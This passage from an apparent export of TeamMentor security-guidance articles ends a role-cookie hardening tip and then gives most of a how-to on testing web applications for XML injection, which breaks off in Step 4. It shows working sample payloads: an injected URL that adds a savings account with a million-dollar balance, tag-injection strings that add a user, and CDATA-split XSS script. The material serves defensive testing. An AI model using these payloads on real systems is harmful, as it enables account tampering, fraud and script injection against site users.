<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; defaultProvider="AspNetSqlRoleProvider"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; createPersistentCookie="false" <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; maxCachedResults="25"/&gt;  </pre></div><p>If the role information for a user is too long to store in a cookie, ASP.NET stores only the most recently used role information in the cookie, and then it looks up additional role information in the data source as required. </p><p>To secure the role cookie: </p><ul><li>Set <strong>cookieRequireSSL</strong> to <strong>true</strong> to ensure the cookie is only used over an SSL protected channel. </li><li>Set <strong>createPersistentCookie</strong> to <strong>false</strong> to prevent the cookie from being stored on the client computer, in which case the cookie is only used to protect the current session. </li><li>Set <strong>cookieTimeout</strong> to the number of minutes for which the cookie is valid.</li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-648965192" Content_Hash="611798573">
    <Metadata>
      <Id>c929a261-7456-428c-b68f-cccc509239bc</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>How to Test for XML Injection Bugs</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Test</Phase>
      <Technology> Any</Technology>
      <Type>How To</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies To:</h1><ul><li>Web services that use XML communication protocols written in web languages such as ASP, PHP, Java, and similar languages. </li><li>Web services that use SOAP communication.</li></ul><p><strong></strong>&nbsp;</p><h1>Summary</h1><p>XML stands for Extensible Markup Language.&nbsp; Similar to HTML, it utilizes tags to store structured data.&nbsp; However, XML is extensible as it allows users to define their own elements in user defined tags.</p><p>In web software, the two most noticeable uses for XML are: </p><ol><li>Store structured data as an alternative to a database. </li><li>Provide a transaction protocol for business-to-business and business-to-client communications (such as SOAP.)</li></ol><h3><em>Store structured data as an alternative to a database</em></h3><p>A server stores user names, passwords, and emails in the <strong><em>user</em></strong> element.&nbsp; It uses a web form to collect user data:</p><p><img src="X:\Trash\GE\clip_image001.png"><strong>&nbsp;</strong></p><p>A user enters the following data and clicks on the <em>Create User</em> button:</p><pre><strong>Username: JohnyC</strong></pre><pre><strong></strong><strong>Password: qwerty</strong></pre><pre><strong>E-mail: johnyc@examplesite.com</strong></pre><p>The client sends this URL to the server application:&nbsp;</p><pre><strong>http://www.examplesite.com/GetProfile.php?username=JohnyC&amp;password=qwerty &amp;email=JohnyC@examplesite.com</strong></pre><pre><strong></strong></pre><p>Once the server receives the URL it creates a <strong><em>user</em></strong> <em>XML</em> <em>element</em> <em>node:</em><strong>&nbsp;</strong></p><pre>&lt;user&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;JohnyC&lt;/username&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;userid&gt;111&lt;userid/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;mail&gt;JohnyC@examplesite.com&lt;/mail&gt;</pre><pre>&lt;/user&gt;</pre><pre><strong><em></em></strong>&nbsp;</pre><h3><em>Provide a transaction protocol for business-to-business and business-to-client communications (such as SOAP)</em></h3><p>The second and most used XML benefit is to integrate web services.&nbsp; SOAP is the communication protocol for XML web services.&nbsp; Before XML, systems had to implement Remote Procedure Calls (RPC) to integrate cross platform services on the web.&nbsp; At that time COBRA or DCE were mostly used to achieve integration, but they were too complex.&nbsp;&nbsp; SOAP defined a standard XML communication protocol that was adopted because of its simplicity.&nbsp; As Microsoft released SOAP, they also released a toolkit that translated COM to SOAP, as well as one to translate Java Functions to SOAP.&nbsp;&nbsp; </p><p>The following code shows an XML-based SOAP client that invokes the <strong>sayHello </strong>method on a SOAP server<a href="about:blank#_edn1" name="_ednref1">[i]</a>:</p><pre>Dim x, h</pre><pre>Set x = CreateObject("MSXML2.DOMDocument")</pre><pre>x.loadXML "&lt;s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/' </pre><pre>&nbsp; xmlns:xsi='http://www.w3.org/1999/XMLSchema-instance' </pre><pre>&nbsp; xmlns:xsd='http://www.w3.org/1999/XMLSchema'&gt;&lt;s:Body&gt;&lt;m:sayHello </pre><pre>&nbsp; xmlns:m='urn:Example1'&gt;&lt;name xsi:type='xsd:string'&gt;James&lt;/name&gt;&lt;</pre><pre>&nbsp; /m:sayHello&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;"</pre><pre>msgbox x.xml, , "Input SOAP Message"</pre><pre>Set h = CreateObject("Microsoft.XMLHTTP")</pre><pre>h.open "POST", "http://localhost:8080"</pre><pre>h.send (x)</pre><pre>while h.readyState &lt;&gt; 4</pre><pre>wend</pre><pre>msgbox h.responseText,,"Output SOAP Message"</pre><pre>&nbsp;</pre><p>For more information about XML Web Services, refer to theMSDN article on the topic<a href="about:blank#_edn2" name="_ednref2">[ii]</a></p><p><strong><em>&nbsp;</em></strong></p><h3><em>XML Injection Bugs</em></h3><p>XML injection means to maliciously feed crafted data to a XML-based web service in order to execute an attack.&nbsp; An XML injection attack varies from adding extra elements in an XML store to tamper with sensitive information to modifying XML store tags to execute cross-site scripting code in a target browser.</p><p>The following steps are needed to test for XML Injection:</p><ol><li>Understand XML Injection attack scenarios. </li><li>Identify high risk components. </li><li>Start testing and exploring. </li><li>Tune test cases.</li></ol><p><strong>Important: </strong>&nbsp;&nbsp;It is necessary to differentiate XML injection with <strong><em>XPATH</em></strong> or <strong><em>XQUERY </em></strong>bugs.&nbsp; They are similar as they both relate to XML, but the logic involved is fundamentally different and will be discussed in individual articles.</p><p><strong>&nbsp;</strong></p><h1>Step 1:&nbsp; Understand XML Injection attack scenarios</h1><p>During the first step, you need to understand how an XML injection attack works both in storage and communication.&nbsp; The following two scenarios elaborate on XML injection attacks:</p><ul><li>Injecting an extra tag to a XML data store. </li><li>Executing cross-site scripting attacks by manipulating the CDATA tag.</li></ul><p>&nbsp;</p><h2><em>Scenario 1:&nbsp; Injecting an extra tag to a XML data store</em></h2><p>A bank site exposes a simple web page to create checking accounts. &nbsp;It takes data from a web form like the one above and builds a URL like this one:</p><pre><strong>http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;password=qwerty&amp;email=JohnyC@examplesite.com</strong></pre><p>&nbsp;The bank uses the data in the URL to construct the following XML in its data store:</p><pre>&lt;user&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;JohnyC&lt;/username&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;userid&gt;111&lt;userid/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;mail&gt;JohnyC@examplesite.com&lt;/mail&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;account type=”checking”&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;created&gt;02-21-2008&lt;/created&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;number&gt;1249109&lt;/number&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;balance&gt;1201&lt;/balance&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/account&gt; </pre><pre>&nbsp;</pre><pre>&lt;/user&gt;</pre><p>The bank doesn’t provide a web interface to create saving accounts.&nbsp; In order to open a saving account, clients need to go to the bank and provide additional information.&nbsp; The bank exposes a security vulnerability that allows the attacker to feed malicious data in the web form.&nbsp; The attacker submits the following URL request:</p><pre><strong>http://www.examplesite.com/CreateChecking.php?username=JohnyC&amp;password=qwerty&amp;email=JohnyC@examplesite.com&lt;/mail&gt;&lt;account type="savings"&gt;&lt;created&gt;03-02-2008&lt;/created&gt;&lt;number&gt;12345678&lt;/number&gt;&lt;balance&gt;1000000&lt;/balance&gt;&lt;/account&gt;</strong></pre><p>&nbsp;When the bank receives this request it doesn’t check for extra tags and builds the following element in its data store:</p><pre>&lt;user&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;JohnyC&lt;/username&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;userid&gt;111&lt;userid/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;mail&gt;JohnyC@examplesite.com&lt;/mail&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;account type="savings"&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;created&gt;03-02-2008&lt;/created&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;number&gt;12345678&lt;/number&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;balance&gt;1000000&lt;/balance&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/account&gt;</pre><pre>&nbsp;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;account type=”checking”&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;created&gt;02-21-2008&lt;/created&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;number&gt;1249109&lt;/number&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;balance&gt;1201&lt;/balance&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;/account&gt; </pre><pre>&lt;/user&gt;</pre><p>&nbsp;</p><p>The bug in the bank web application here allows the attacker to remotely create a savings account with a $1000000 balance.</p><p><strong><em>&nbsp;</em></strong></p><h2><em>Scenario 2:&nbsp; Executing cross-site scripting attacks by manipulating the CDATA tag </em></h2><p>XML uses the CDATA tag to escape blocks of text that would be otherwise recognized as markup.&nbsp; All data enclosed in between the tags <strong>"&lt;![CDATA[" </strong>and <strong>"]]&gt;" </strong>will not be parsed as markup.&nbsp; </p><p>A vulnerable server uses a file named scenarios.xml to store the title and the data for each scenario:</p><pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</pre><pre>&lt;scenarios&gt;</pre><pre>&nbsp;</pre><pre>&lt;scenario&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;title&gt;XSS scenario&lt;/title&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;data&gt;&lt;![CDATA[this is not to be parsed &lt;!-- as XML '"&gt;&lt;]]&gt;&lt;/data&gt;</pre><pre>&lt;/scenario&gt;&nbsp;&nbsp;&nbsp; </pre><pre>&nbsp;</pre><pre>etc…</pre><pre>&nbsp;</pre><pre>&lt;/scenarios&gt;</pre><p><strong>&nbsp;</strong></p><p>The application blindly builds a page (scenarios.php) from the XML file using the following code and then sends the page back to the client:</p><p><strong>&nbsp;</strong></p><pre>&lt;? php</pre><pre>&nbsp;</pre><pre>&nbsp; $objDOM = new DOMDocument(); </pre><pre>&nbsp; $objDOM-&gt;load("scenarios.xml"); </pre><pre>&nbsp; $scenario = $objDOM-&gt;getElementsByTagName("scenario");</pre><pre>&nbsp; </pre><pre>&nbsp; foreach( $scenario as $value )</pre><pre>&nbsp; {</pre><pre>&nbsp;&nbsp;&nbsp; $title&nbsp; = $value-&gt;getElementsByTagName("title")-&gt;item(0)-&gt;nodeValue;</pre><pre>&nbsp;&nbsp;&nbsp; $data =&nbsp;&nbsp; $value-&gt;getElementsByTagName("data")-&gt;item(0)-&gt;nodeValue;</pre><pre>&nbsp;</pre><pre>&nbsp;&nbsp;&nbsp; echo "$title:&lt;br&gt;$data&lt;br&gt;";</pre><pre>&nbsp; }</pre><pre>&nbsp; </pre><pre>?&gt;</pre><p><strong>&nbsp;</strong></p><p>The scenario above will generate the following output:</p><pre>XSS scenario:<br>this is not be parsed as XML '"&gt;&lt;</pre><p><strong>&nbsp; </strong></p><p>Now the attacker gets control of scenarios.xml and modifies the data tag to look like this:<strong></strong></p><pre>&lt;scenario&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;title&gt;XSS scenario&lt;/title&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;data&gt;&lt;![CDATA[&lt;script&gt;alert('XSS')&lt;/script&gt;]]&gt;&lt;/data&gt;</pre><pre>&lt;/scenario&gt;&nbsp;&nbsp;&nbsp; </pre><p>&nbsp;</p><p>This will result in the vulnerable application building a page similar to the one below and sending it to the client:</p><pre>&lt;html&gt;</pre><pre>&nbsp;</pre><pre>XSS scenario:</pre><pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre><pre>&nbsp;</pre><pre>&lt;/html&gt;</pre><p>&nbsp;</p><p>That finally results in a cross-site scripting attack because the server doesn’t validate the XML output before sending it back as HTML to the client.</p><p>&nbsp;</p><h1>Step 2:&nbsp; Identify high risk components</h1><p>The next steps for XML Injection testing are to list all of the places where code builds XML statements from user supplied input; and to understand how and where our application manipulates statements, and how it uses them to modify its data store or to invoke XML web methods.&nbsp; The most common are:</p><ul><li>Profile-related web pages. </li><li>E-Commerce or financial account-related pages. </li><li>XML web service interaction methods. </li><li>XML-based system-level clients. </li><li>Systems that read from XML backend and blindly construct responses to Internet clients.</li></ul><p>&nbsp;</p><h2><em>Identify all high risk components </em></h2><p>This subtask consists of indentifying the coding errors that lead to XML injection bugs.&nbsp; XML injection bugs exist for two main reasons.&nbsp; First, when a server-side application directly utilizes user-supplied strings that arrive over the Internet to add into their XML data store or perform other XML-related tasks.&nbsp; The application doesn’t do any sort of data validation on the strings, and therefore allows for injection of XML tags.&nbsp; In the second case, an application is vulnerable if it reads from an XML store and blindly constructs an HTML page to send back to the client.</p><p>During this subtask, you need to go through all web pages in the application under test and look for any XML interaction.&nbsp; Any page or method that uses XML to transmit data must be listed as a high risk component.&nbsp;&nbsp; Following are some common examples of what you need to look for when reviewing code for XML injection bugs.</p><h2><em>Identify the usage of XML parsers</em></h2><p>Server-side applications can choose from a wide variety of XML parsers depending on the language they are written (ASP, PHP, Java, etc.)&nbsp; It is important that you recognize if the application you’re testing uses any of these parsers.&nbsp; If so, it is a clear indication that the application manipulates XML.&nbsp; </p><ul><li>SAXParser (Java) </li><li>MSXML (including Microsoft XML DOM Parser) </li><li>Xerces (Java, C++, Perl) </li><li>Oracle XML Parser </li><li>XML Booster </li><li>XML::Parser (form Perl) </li><li>XParse</li></ul><p>This short list illustrates that the programmer has different choices when selecting an XML parser.&nbsp; Make sure to look for the presence of any of these.&nbsp; In addition, keep up with the latest XML parsing technology and research for additional parsers that your application might use.</p><h2><em>Look for code that writes XML from user-supplied input</em></h2><p>Any code that uses user-supplied input (from web forms, URLs, etc) must be marked as high risk.&nbsp; Below is an example that uses the input parameter from a URL to construct XML:</p><pre>set xmlDoc=CreateObject("Microsoft.XMLDOM")</pre><pre>xmlDoc.async="false"</pre><pre>xmlDoc.load("accounts.xml")&nbsp;</pre><pre>for each x in xmlDoc.documentElement.childNodes</pre><pre>&nbsp; document.write(x.nodename)</pre><pre>&nbsp; document.write(": ")</pre><pre>&nbsp; document.write(x.text)</pre><pre>&nbsp; document.write(Request.QueryString("input"))</pre><pre>next</pre><p><strong><em>&nbsp;</em></strong></p><h2><em>Detect applications that use the CDATA tag</em></h2><p>Look at both the application code and storage XML files to identify the usage of the CDATA tag.&nbsp; Identifying CDATA tags inside XML documents is easy.&nbsp; Just search the contents of all XML documents in your application looking for the string “CDATA”.&nbsp; Then track down the code that uses the data read from this kind of tag.&nbsp; Any component that directly writes the contents of CDATA tags to an HTML response is vulnerable to cross-site scripting attacks through XML injection:</p><pre>Response.Write(contents from CDATA tag)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (ASP)</pre><pre>echo contents from CDATA tag;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</pre><pre>print contents from CDATA tag;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP)</pre><p>&nbsp;</p><h2><em>Don’t rely on XML Document Type Definitions (DTDs)</em></h2><p>Programmers might assume that defining XML tags using DTD<a href="about:blank#_edn3" name="_ednref3">[iii]</a> protects them against XML injection attacks.&nbsp; As we will see later on, this is a misconception.&nbsp; Include any document that handles XML (using DTD or not) as a high risk component. </p><p>&nbsp;</p><h2><em>Match High Risk Components with Entry Points</em></h2><p>Non-validated XML data can come from any application entry point.&nbsp; Make sure to cover all the possible sources of malicious data which might get passed to a client.&nbsp; Common data sources include:</p><ul><li>Web forms </li><li>URL contents </li><li>Flash parameters </li><li>XML store contents </li><li>Web service data </li><li>Graphical User Interface</li></ul><p>&nbsp;</p><p>List the high risk application components (usually web pages such as the ones in the scenarios above) and their related entry points to systematically aid with your testing: </p><p><br><br></p><table><tbody><tr><td><p><strong>Component</strong></p></td><td><p><strong>Line</strong></p></td><td><p><strong>URL</strong></p></td><td><p><strong>Form</strong></p></td><td><p><strong>Flash</strong></p></td><td><p><strong>DB</strong></p></td><td><p><strong>Service</strong></p></td></tr><tr><td><p><strong>CreateChecking.php</strong></p></td><td><p>101</p></td><td><p>X</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>&nbsp;</strong></p></td><td><p>112</p></td><td><p>X</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>&nbsp;</strong></p></td><td><p>165</p></td><td><p>X</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>Response.php</strong></p></td><td><p>1001</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>&nbsp;</strong></p></td><td><p>1116</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>Present.php</strong></p></td><td><p>234</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>&nbsp;</strong></p></td><td><p>531</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>X</p></td><td><p><strong>&nbsp;</strong></p></td><td><p><strong>&nbsp;</strong></p></td></tr><tr><td><p><strong>showAccount.php</strong></p></td><td><p>432</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>&nbsp;</p></td><td><p>X</p></td></tr></tbody></table><p>&nbsp;</p><p>&nbsp;</p><h1>Step 3:&nbsp; Start Testing and Exploring&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </h1><p>This step of testing is focused on submitting basic XML injection fuzz strings and observing how the application reacts.&nbsp; Then, we will try to execute two simple XML injection attacks as shown in the previous scenarios:&nbsp; tag injection and CDATA XSS.&nbsp; </p><p>Try all of the tests in this step through the easiest entry point for each high risk component.&nbsp; In step 4 you will tune your test case data to cover the different formats and encoding depending on the remaining entry points.</p><p><strong><em>&nbsp;</em></strong></p><h2><em>Start with simple fuzz strings</em></h2><p>Successful XML injection testing depends on whether the tester is able to send XML data that will end up being processed as expected XML. </p><p><strong><em>Closing quotes and tag characters</em></strong></p><p>It is recommend that you start testing with a simple XML string consisting of a single quote, a closing tag character, an opening tag character and a double quote.&nbsp; Try these four characters separately and combined:</p><p>'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;&nbsp;&nbsp;&nbsp;&nbsp; &lt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (separately)</p><p>or&nbsp; </p><p>'"&gt;&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &gt;'"&lt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;&gt;'"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (combined)</p><p>Then, observe how the XML-based server responds.&nbsp; The idea is to modify a valid XML tag such as the first string below, to the second one.&nbsp; Here, set the <strong>$input</strong> variable to a single quote ('):</p><pre><strong>&lt;node attrib='$input'/&gt;</strong></pre><pre><strong></strong></pre><pre><strong>&lt;node attrib='''/&gt;</strong></pre><pre><strong></strong></pre><p>Because the <em>node</em> element will now have the <em>attrib</em> attribute set to <strong>''' (</strong>note the extra single quote), it will result in invalid XML.&nbsp; An invalid XML message from the server is a good indication that there are potential XML injection bugs present in the server application.</p><pre></pre><p><strong><em>Comment strings</em></strong></p><p>Another way to generate invalid XML is to add the start of an XML comment:&nbsp;</p><p>xyz&lt;!--</p><p>Let’s say that you entered the string above as the <em>username</em>.&nbsp; The resulting XML will now look like this and will end up being invalid:</p><pre></pre><pre>&lt;user&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;xyz&lt;!--&lt;/username&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;userid&gt;111&lt;userid/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;mail&gt;JohnyC@examplesite.com&lt;/mail&gt;</pre><pre>&lt;/user&gt;</pre><p><strong><em>Ampersand (&amp;)</em></strong></p><p>XML uses the ampersand character to refer to another entity in its user-defined XML schema.&nbsp; For example, if the user passes the following string as the <em>username,</em> it will result in the corresponding XML:</p><pre>&amp;amp;xyz</pre><p>Results in:</p><pre>&lt;user&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;username&gt;&amp;xyz&lt;/username&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password&gt;qwerty&lt;/password&gt; </pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;userid&gt;111&lt;userid/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;mail&gt;JohnyC@examplesite.com&lt;/mail&gt;</pre><pre>&lt;/user&gt;&nbsp;</pre><p>This will attempt to refer to the <strong>&amp;xyz</strong> entity of the XML document.&nbsp;&nbsp; If the document doesn’t contain this entity, then the newly built tag above will result in an invalid XML document.</p><p><strong><em>&nbsp;</em></strong></p><h2><em>Learn from error messages to conduct a real attack</em></h2><p>The purpose of creating invalid XML documents is so that you can start gaining information about the underlying XML format based on error messages they generate.&nbsp; Let’s say you inserted the following fuzz string (‘) in an input field and the server responded with the following error message:</p><pre>Invalid XML:&nbsp;</pre><pre>&lt;user name='''/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;id ='1232'/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;realname='tester'&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password='ind3$truct'/&gt;</pre><pre>&lt;user&gt;</pre><p>Now, consider how you can utilize this information to create an additional, valid user while conserving the structure and format of the original XML document:</p><pre><strong>$input = attacker'&gt;&lt;id ='1234'/&gt;&lt;realname='hacker'&gt;&lt;password='qwerty'/&gt;&lt;/user&gt;</strong></pre><pre><strong>&lt;user name ='real_user</strong></pre><p>&nbsp;</p><p>results in the server creating an extra element:</p><pre>&lt;user name='attacker'/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;id ='1234'/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;realname='hacker'&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password='ind3$truct'/&gt;</pre><pre>&lt;/user&gt;</pre><pre>&lt;user name='real_user'/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;id ='1232'/&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;realname='tester'&gt;</pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;password='ind3$truct'/&gt;</pre><pre>&lt;/user&gt;</pre><p><strong><em></em></strong></p><h2><em>Try to exploit CDATA tags with Cross-Site Scripting (XSS) attacks</em></h2><p>To finish this step try to exploit the contents of CDATA tags to see if you can execute an XSS attack.&nbsp; This test is quite straight forward, simply remember that the XML parser extracts all data enclosed in between the tags <strong>"&lt;![CDATA[" </strong>and <strong>"]]&gt;" </strong>to form a new string.&nbsp; For example:</p><pre>&lt;![CDATA[xyz]]&gt;</pre><p>Becomes:</p><pre>xyz</pre><p>In the same manner:</p><pre>&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;</pre><p>Becomes:</p><pre>&lt;script&gt;</pre><p>Finally:</p><pre>&lt;![CDATA[&lt;script&gt;alert('XSS')&lt;/script&gt;]]&gt;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</pre><p>Becomes:</p><pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre><pre>&nbsp;</pre><h1>Step 4:&nbsp; Tune Test Cases</h1><p>During this step you must focus in modifying your test case data to cover all entry points based on the format of each specific entry point.&nbsp; In 